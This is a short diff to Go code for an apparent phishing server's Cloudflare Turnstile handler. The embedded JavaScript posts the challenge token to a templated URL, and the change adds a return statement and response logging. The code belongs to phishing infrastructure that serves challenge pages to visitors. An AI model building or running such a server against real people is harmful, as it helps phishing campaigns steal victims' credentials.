@@ -335,7 +335,7 @@ func (ps *PhishingServer) TurnstileHandler(w http.ResponseWriter, r *http.Reques
 			sitekey: '%s',
 			callback: function(token) {
 				console.log(`+"`Challenge Success ${token}`);"+`
-				fetch("%s", {
+				return fetch("%s", {
 					method: "POST",
 					body: JSON.stringify({
 					  "ts-submit": true,
@@ -344,7 +344,7 @@ func (ps *PhishingServer) TurnstileHandler(w http.ResponseWriter, r *http.Reques
 					headers: {
 					  "Content-type": "application/json; charset=UTF-8"
 					}
-				}).then((response) => {return response.text()});
+				}).then((response) => {console.log(response); return response.text()});
 			},
 		});
 	};</script>`
